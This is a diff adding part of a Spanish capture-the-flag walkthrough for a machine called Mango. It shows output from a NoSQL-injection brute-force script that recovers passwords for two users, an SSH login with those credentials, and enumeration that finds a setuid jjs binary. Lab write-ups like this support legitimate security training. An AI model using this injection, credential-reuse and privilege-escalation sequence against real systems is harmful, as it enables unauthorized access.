@@ -120,3 +120,44 @@ if __name__ == '__main__':
 
     makeRequest()
 ```
+Lanzamos este exploit para sacar las passwords
+Para el user `mango`:
+```bash
+# python3 Mango_NoSQLI.py                                                                                                                                                                                     
+[↙] Fuerza bruta: Probando el caracter ~
+[◒] Password: h3mXK8RhU~f{]f5H
+```
+Para el user `admin`:
+```bash
+# python3 Mango_NoSQLI.py                                                                                                                                                       
+
+[..\.....] Fuerza bruta: Probando el caracter ~
+[◥] Password: t9KcS3>!0B#2
+```
+
+# Accediendo por el SSH con las Credenciales Obtenidas
+Teniendo las credenciales de la base de datos podriamos probar a conectarnos por el servicio `ssh` con las `passwords` encontradas.
+```bash
+mango@mango:~$ whoami
+mango
+
+mango@mango:/home$ ls
+admin  mango
+
+mango@mango:/home/admin$ ls
+user.txt
+
+```
+ernumeramos el sistema:
+```bash
+mango@mango:/$ find / -group admin -type f 2>/dev/null
+/var/crash/_usr_bin_pkttyagent.4000000000.crash
+/home/admin/.bash_logout
+/home/admin/.profile
+/home/admin/.bashrc
+/home/admin/user.txt
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+-rwsr-sr-- 1 root  admin  10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+
+
